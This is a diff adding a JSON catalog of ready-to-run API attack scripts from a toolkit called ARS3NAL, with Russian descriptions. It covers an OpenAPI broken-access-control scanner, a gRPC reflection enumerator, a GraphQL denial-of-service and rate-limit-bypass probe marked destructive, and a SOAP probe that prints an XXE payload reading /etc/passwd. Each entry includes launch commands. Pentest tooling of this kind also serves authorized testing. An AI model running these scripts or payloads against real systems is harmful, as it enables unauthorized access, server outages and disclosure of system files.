@@ -1,0 +1,76 @@
+{
+  "category": "API (REST / gRPC / GraphQL)",
+  "group": "modern",
+  "catOrder": 62,
+  "entries": [
+    {
+      "title": "OpenAPI / Swagger mass tester (path x method)",
+      "lang": "python",
+      "tags": [
+        "api",
+        "openapi",
+        "swagger",
+        "bola",
+        "bac"
+      ],
+      "rating": "must",
+      "deps": "pip install requests pyyaml",
+      "placeholders": "{{SPEC}} · {{BASE}} · {{TOKEN}}",
+      "source": "https://swagger.io/specification/",
+      "license": "GPL-3.0 (оригинал)",
+      "body": "Парсит **OpenAPI/Swagger-спеку** (JSON или YAML) и автоматически дёргает каждый `path` x `method`, помечая аномалии: **200 на эндпоинте, который должен требовать auth** (broken access control), и **500** (необработанная ошибка - точка для дальнейшего фаззинга). Path-параметры подставляются плейсхолдером.\n\n> Спека = карта атаки. Прогоняй дважды: без токена и с токеном low-priv. Эндпоинт, отдающий 200 без токена или одинаковый ответ обоим ролям, - кандидат на BOLA/BFLA.\n\ndeps: `pip install requests pyyaml`. placeholders: `{{SPEC}}` (URL или файл openapi.json), `{{BASE}}` (база API), `{{TOKEN}}` опц.\n\n```python\n#!/usr/bin/env python3\n# openapi_mass_test.py - ARS3NAL (GPL-3.0). Only for AUTHORIZED testing.\nimport argparse, json, sys, requests\ntry:\n    import yaml\nexcept ImportError:\n    yaml = None\n\ndef load_spec(src):\n    if src.startswith(\"http\"):\n        txt = requests.get(src, verify=False, timeout=20).text\n    else:\n        txt = open(src, encoding=\"utf-8\").read()\n    try:\n        return json.loads(txt)\n    except json.JSONDecodeError:\n        if not yaml:\n            sys.exit(\"[!] YAML spec but pyyaml missing: pip install pyyaml\")\n        return yaml.safe_load(txt)\n\ndef base_url(spec, override):\n    if override:\n        return override.rstrip(\"/\")\n    servers = spec.get(\"servers\") or []\n    if servers:\n        return servers[0][\"url\"].rstrip(\"/\")\n    # swagger 2.0\n    host = spec.get(\"host\", \"\")\n    bp = spec.get(\"basePath\", \"\")\n    sch = (spec.get(\"schemes\") or [\"https\"])[0]\n    return f\"{sch}://{host}{bp}\".rstrip(\"/\")\n\ndef fill_path(p):\n    # /users/{id} -> /users/1 ; {uuid} -> placeholder\n    import re\n    return re.sub(r\"\\{[^}]+\\}\", \"1\", p)\n\ndef main():\n    ap = argparse.ArgumentParser(description=\"ARS3NAL OpenAPI mass tester\")\n    ap.add_argument(\"-s\", \"--spec\", required=True, help=\"openapi.json/.yaml URL or file\")\n    ap.add_argument(\"-b\", \"--base\", default=\"\", help=\"override base URL\")\n    ap.add_argument(\"-t\", \"--token\", default=\"\", help=\"bearer token (run once with, once without)\")\n    ap.add_argument(\"--timeout\", type=int, default=15)\n    a = ap.parse_args()\n    requests.packages.urllib3.disable_warnings()\n    spec = load_spec(a.spec)\n    base = base_url(spec, a.base)\n    hdr = {\"Authorization\": \"Bearer \" + a.token} if a.token else {}\n    print(f\"[*] base={base}  auth={'yes' if a.token else 'NONE'}\\n\")\n    paths = spec.get(\"paths\", {})\n    for path, ops in paths.items():\n        for method, meta in ops.items():\n            m = method.upper()\n            if m not in (\"GET\", \"POST\", \"PUT\", \"DELETE\", \"PATCH\"):\n                continue\n            url = base + fill_path(path)\n            secured = bool(meta.get(\"security\") or spec.get(\"security\"))\n            try:\n                r = requests.request(m, url, headers=hdr, timeout=a.timeout,\n                                     verify=False, allow_redirects=False)\n                code = r.status_code\n            except requests.RequestException as e:\n                print(f\"  ERR  {m:6s} {path}  ({e})\"); continue\n            flag = \"\"\n            if secured and not a.token and code == 200:\n                flag = \"  <-- 200 on SECURED w/o token (BAC?)\"\n            elif code == 500:\n                flag = \"  <-- 500 server error (fuzz target)\"\n            elif code in (401, 403):\n                flag = \"\"\n            print(f\"  {code}  {m:6s} {path}{flag}\")\n    print(\"\\n[=] сравни этот прогон с прогоном под другой ролью (BOLA/BFLA)\")\n\nif __name__ == \"__main__\":\n    main()\n```\n\nЗапуск:\n```bash\npython3 openapi_mass_test.py -s https://target/openapi.json            # без токена\npython3 openapi_mass_test.py -s ./swagger.yaml -b https://target/api -t \"$TOKEN\"\n```"
+    },
+    {
+      "title": "gRPC reflection enumeration (grpcurl wrapper)",
+      "lang": "bash",
+      "tags": [
+        "api",
+        "grpc",
+        "reflection",
+        "grpcurl"
+      ],
+      "rating": "must",
+      "deps": "grpcurl (MIT)",
+      "placeholders": "{{TARGET}}",
+      "source": "https://github.com/fullstorydev/grpcurl",
+      "license": "GPL-3.0 (обёртка) · grpcurl MIT",
+      "body": "Энумерация **gRPC-сервиса через server reflection** утилитой `grpcurl`: список сервисов, описание методов и сообщений, пробный вызов. Если рефлексия включена, получаешь полную карту API без `.proto`-файлов.\n\n> `-plaintext` = подключение **без TLS** (не «HTTP/1.1»), для cleartext-gRPC. `-insecure` = TLS, но без проверки сертификата. Подбирай флаг под цель. grpcurl - bundled-friendly (MIT).\n\ndeps: `grpcurl` (apt/brew install grpcurl). placeholders: `{{TARGET}}` (host:port, напр. 10.0.0.5:50051).\n\n```bash\n#!/usr/bin/env bash\n# grpc_reflect_enum.sh - ARS3NAL (GPL-3.0). Wraps grpcurl (MIT). AUTHORIZED testing only.\nset -u\nT=\"${1:?usage: grpc_reflect_enum.sh <host:port> [-plaintext|-insecure]}\"\nMODE=\"${2:--plaintext}\"   # -plaintext (no TLS) | -insecure (TLS, skip cert)\n\necho \"[*] target=$T mode=$MODE\"\ncommand -v grpcurl >/dev/null || { echo \"[!] install grpcurl first\"; exit 1; }\n\necho \"=== services ===\"\nSVCS=$(grpcurl $MODE \"$T\" list 2>&1)\necho \"$SVCS\"\necho \"$SVCS\" | grep -qiE 'reflection|cannot|unimplemented' && \\\n  echo \"[i] если reflection выключен -> нужен .proto: grpcurl -proto x.proto ...\"\n\necho\necho \"=== methods + messages per service ===\"\necho \"$SVCS\" | grep -vi reflection | while read -r svc; do\n  [ -z \"$svc\" ] && continue\n  echo \"--- $svc ---\"\n  grpcurl $MODE \"$T\" describe \"$svc\" 2>/dev/null\ndone\n\necho\necho \"=== sample empty call (auth / shape probe) ===\"\nFIRST=$(echo \"$SVCS\" | grep -vi reflection | head -1)\nif [ -n \"$FIRST\" ]; then\n  M=$(grpcurl $MODE \"$T\" list \"$FIRST\" 2>/dev/null | head -1)\n  [ -n \"$M\" ] && grpcurl $MODE -d '{}' \"$T\" \"$M\" 2>&1 | head -10\nfi\n\necho \"[=] reflection on = карта API; ошибки auth на вызове = точка обхода\"\n```\n\nЗапуск:\n```bash\nbash grpc_reflect_enum.sh 10.0.0.5:50051 -plaintext\nbash grpc_reflect_enum.sh api.target.com:443 -insecure\n```"
+    },
+    {
+      "title": "GraphQL DoS / rate-limit-bypass probe (5 vectors)",
+      "lang": "python",
+      "tags": [
+        "api",
+        "graphql",
+        "dos",
+        "introspection",
+        "cve-2024-39895"
+      ],
+      "rating": "must",
+      "deps": "pip install requests",
+      "placeholders": "{{URL}} · {{FIELD}}",
+      "source": "https://nvd.nist.gov/vuln/detail/CVE-2024-39895",
+      "license": "GPL-3.0 (оригинал)",
+      "badges": [
+        "destructive"
+      ],
+      "body": "Проба **GraphQL DoS и обхода rate-limit** четырьмя векторами: introspection-дамп схемы, **alias-amplification** (N копий тяжёлого поля в одном запросе), **deep nesting** (циклический обход связей), **JSON-batching** (массив запросов в одном HTTP - обходит per-request RL) и **field-duplication** (повтор одного поля сотни раз - **CVE-2024-39895 в Directus** клал сервер именно так).\n\n> destructive: amplification и nesting реально нагружают сервер. Начинай с малых `--mult`/`--depth`, следи за временем ответа. Introspection часто открыт даже когда «отключён» в проде.\n\ndeps: `pip install requests`. placeholders: `{{URL}}` (graphql endpoint), `{{FIELD}}` (тяжёлое поле из схемы).\n\n```python\n#!/usr/bin/env python3\n# graphql_dos_probe.py - ARS3NAL (GPL-3.0). Only for AUTHORIZED testing.\nimport argparse, time, requests\n\nINTROSPECT = \"{__schema{queryType{name} types{name fields{name}}}}\"\n\ndef post(url, query, hdr, timeout, batch=None):\n    body = batch if batch is not None else {\"query\": query}\n    t0 = time.time()\n    r = requests.post(url, json=body, headers=hdr, timeout=timeout, verify=False)\n    return r, time.time() - t0\n\ndef alias_amplification(field, mult):\n    parts = \" \".join(f\"a{i}: {field}\" for i in range(mult))\n    return \"{\" + parts + \"}\"\n\ndef field_duplication(field, mult):\n    # CVE-2024-39895 class: один и тот же лист повторён N раз\n    parts = \" \".join([field] * mult)\n    return \"{\" + parts + \"}\"\n\ndef deep_nesting(field, depth):\n    inner = field\n    for _ in range(depth):\n        inner = f\"{field}{{ {inner} }}\"\n    return \"{\" + inner + \"}\"\n\ndef main():\n    ap = argparse.ArgumentParser(description=\"ARS3NAL GraphQL DoS / RL-bypass probe\")\n    ap.add_argument(\"-u\", \"--url\", required=True)\n    ap.add_argument(\"-f\", \"--field\", default=\"__typename\", help=\"heavy field from schema\")\n    ap.add_argument(\"--mult\", type=int, default=50, help=\"alias/dup count\")\n    ap.add_argument(\"--depth\", type=int, default=6)\n    ap.add_argument(\"--batch\", type=int, default=20, help=\"JSON-batch size\")\n    ap.add_argument(\"--header\", action=\"append\", default=[], help=\"Extra header k:v\")\n    ap.add_argument(\"--timeout\", type=int, default=30)\n    a = ap.parse_args()\n    requests.packages.urllib3.disable_warnings()\n    hdr = {\"Content-Type\": \"application/json\"}\n    for h in a.header:\n        k, _, v = h.partition(\":\"); hdr[k.strip()] = v.strip()\n\n    print(\"=== [1] introspection ===\")\n    r, dt = post(a.url, INTROSPECT, hdr, a.timeout)\n    on = \"__schema\" in r.text\n    print(f\"  status={r.status_code} time={dt:.2f}s introspection={'ON' if on else 'off'}\")\n\n    print(\"=== [2] alias amplification ===\")\n    r, dt = post(a.url, alias_amplification(a.field, a.mult), hdr, a.timeout)\n    print(f\"  x{a.mult} status={r.status_code} time={dt:.2f}s\")\n\n    print(\"=== [3] field duplication (CVE-2024-39895 class) ===\")\n    r, dt = post(a.url, field_duplication(a.field, a.mult), hdr, a.timeout)\n    print(f\"  x{a.mult} status={r.status_code} time={dt:.2f}s\")\n\n    print(\"=== [4] deep nesting ===\")\n    r, dt = post(a.url, deep_nesting(a.field, a.depth), hdr, a.timeout)\n    print(f\"  depth={a.depth} status={r.status_code} time={dt:.2f}s\")\n\n    print(\"=== [5] JSON batching (per-request RL bypass) ===\")\n    batch = [{\"query\": \"{__typename}\"} for _ in range(a.batch)]\n    r, dt = post(a.url, None, hdr, a.timeout, batch=batch)\n    accepted = r.text.count(\"__typename\") if r.ok else 0\n    print(f\"  batch={a.batch} status={r.status_code} time={dt:.2f}s accepted~{accepted}\")\n    print(\"\\n[=] рост времени с ростом mult/depth = нет cost-limit; batch>1 ok = RL обходится\")\n\nif __name__ == \"__main__\":\n    main()\n```\n\nЗапуск:\n```bash\npython3 graphql_dos_probe.py -u https://target/graphql -f users --mult 50 --depth 6 --batch 20\n```"
+    },
+    {
+      "title": "SOAP / WSDL probe (operations + XXE skeleton)",
+      "lang": "bash",
+      "tags": [
+        "api",
+        "soap",
+        "wsdl",
+        "xxe"
+      ],
+      "rating": "nice",
+      "deps": "curl, xmllint (опц.)",
+      "placeholders": "{{URL}}",
+      "source": "https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing",
+      "license": "GPL-3.0 (оригинал)",
+      "body": "Проба **SOAP/WSDL**: тянет `?wsdl`, перечисляет операции и печатает скелет SOAP-конверта - готовую точку для инъекций (XXE через XML, command в параметрах). Старые SOAP-сервисы часто без auth и парсят внешние entity.\n\ndeps: `curl`, опц. `xmllint`. placeholders: `{{URL}}` (endpoint сервиса).\n\n```bash\n#!/usr/bin/env bash\n# soap_wsdl_probe.sh - ARS3NAL (GPL-3.0). Only for AUTHORIZED testing.\nset -u\nU=\"${1:?usage: soap_wsdl_probe.sh <service-url>}\"\nC=\"curl -s -k --max-time 12\"\n\necho \"[*] fetching WSDL\"\nWSDL=$($C \"$U?wsdl\"); [ -z \"$WSDL\" ] && WSDL=$($C \"$U?WSDL\")\n[ -z \"$WSDL\" ] && { echo \"[!] no WSDL at $U?wsdl\"; exit 1; }\necho \"$WSDL\" | head -c 200; echo \" ...\"\n\necho\necho \"=== operations ===\"\necho \"$WSDL\" | grep -oE '<(wsdl:)?operation name=\"[^\"]+\"' | \\\n  sed -E 's/.*name=\"([^\"]+)\".*/  \\1/' | sort -u\n\necho\necho \"=== target namespace ===\"\necho \"$WSDL\" | grep -oE 'targetNamespace=\"[^\"]+\"' | head -1\n\necho\necho \"=== SOAP envelope skeleton (XXE injection point) ===\"\ncat <<'EOF'\n  <?xml version=\"1.0\"?>\n  <!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]>\n  <soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n    <soap:Body>\n      <OPERATION_NAME>\n        <param>&xxe;</param>\n      </OPERATION_NAME>\n    </soap:Body>\n  </soap:Envelope>\nEOF\necho \"[=] подставь операцию и POST на endpoint с Content-Type: text/xml\"\n```\n\nЗапуск:\n```bash\nbash soap_wsdl_probe.sh https://target/services/Calc\n```"
+    }
+  ]
+}
